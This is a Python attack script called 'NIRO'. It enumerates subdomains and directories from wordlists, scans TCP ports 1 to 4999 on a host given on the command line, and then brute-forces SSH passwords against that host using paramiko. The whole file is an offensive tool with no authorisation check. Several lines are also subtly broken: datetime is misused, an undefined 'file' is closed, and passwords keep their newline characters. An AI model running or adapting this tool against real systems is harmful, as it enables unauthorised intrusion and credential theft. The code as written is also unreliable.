import pyfiglet
import socket,requests,datetime
import os,sys
import paramiko


intro1 = pyfiglet.figlet_format("--->\\NIRO/<---")
print(intro1)

intro2 = pyfiglet.figlet_format("Authored by EN-NIARI AMR \nFramed By EL MOSTAPHA CHAKIR" , font="digital")
print(intro2)

now =datetime.now()
dt_string = now.strftime("%d/%m/%Y %H:%M:%S")

print("************************************************")
print("---------------------------------------------------------------------------------------")
print("+ URL      :            http://"+sys.argv[1])
print("+ Time     :            "+ dt_string)
print("+ Type     :            SUBDOMAIN,search DIRECTORY ,PORT scanning                      ")
print("---------------------------------------------------------------------------------------")

print("************************************************")
print("\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/")
print("[*-*] Starting NIRO in SUBDOMAIN enumeration mode ...")


s = pyfiglet.figlet_format("SUB-DOMAIN")
print(s)

sub_file = input("[+] Enter subdomains file location : ")
sub_list = open(str(sub_file),'r')
subdoms = sub_list.readlines()

for sub in subdoms:
   sub_domains = f"http://{sub}.{sys.argv[1]}"
   try :
      requests.get(sub_domains)
   except requests.ConnectionError:
     pass
   else:
     print("[+] --> Valid domain : ",sub_domains)

sub_list.close()

print("---------------END OF SUBDOMAIN ENUMERATION-----------------")
print("[*-*] Starting NIRO in DIRECTORY enumeration mode ...")

d = pyfiglet.figlet_format("DIRECTORY")
print(d)

dir_file = input("[+] Enter directory name file location : ")

directory = open(str(dir_file),'r')
directory_name = directory.readlines()

for dir in directory_name :
   dir_enum = f"http://{sys.argv[1]}/{dir}"
   r= requests.get(dir_enum)
   if r.status_code == 404:
     pass
   else:
    print("[+] ---> Valid Directory : ",dir_enum)

file.close()

print("---------------END OF DIRECTORY ENUMERATION-----------------")

print("[*-*] Starting NIRO in PORT SCANNING mode ...")

p = pyfiglet.figlet_format("PORT-SCANNING")
print(p)

open_ports=[]

ports=range(1,5000)
def probe_port(ip,port,result=1):
   try:
     sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
     sock.settimeout(5)
     r= sock.connect_ex((ip,port))
     if r == 0:
        result = r
     sock.close()
   except Exception as e:
     pass
   return result


for port in ports:
     sys.stdout.flush()
     response= probe_port(sys.argv[1],port)
     if response == 0:
         open_ports.append(port)

if open_ports:
    print("Open Ports are : ")
    print(sorted(open_ports))
else:
    print("Looks like no ports are open") 

print("---------------END OF PORT SCANNING-----------------")
print("[*-*] Starting NIRO in SSH Brute force mode ...")

b = pyfiglet.figlet_format("SSH BruteForce")
print(b)

username = str(input("[+] Enter Username : "))
password_file = input("[+] Enter password file location : ")


def ssh_connect(password, code=0):
    ssh= paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
       ssh.connect( sys.argv[1] ,port=22,username = username, password=password)
    except paramiko.AuthenticationException :
       code = 1
    ssh.close()
    return code

if probe_port(sys.argv[1],22) == 0:  #verification is port 22 open and then continue
        print(" -----------------------")
        print("|   TCP PORT 22 OPEN    |")
        print(" -----------------------")
        ssh_file = open(str(password_file), 'r')
        ssh_line = ssh_file.readlines()   
        for password in ssh_line:

                try :
                    res = ssh_connect(password)
                    if (res==0) :
                        print("[OK] Password found: "+ password)
                        print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
                        print("username : " +username)
                        print("Password : "+ password)
                        print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
                        exit(0)
                    elif res == 1:
                        print("[NO] No luck")
                except Exception as e :
                        print(e)
                        pass
else:
        print("(-_-) PORT 22 CLOSED...")

print("---------------END OF SSH BruteForce-----------------")
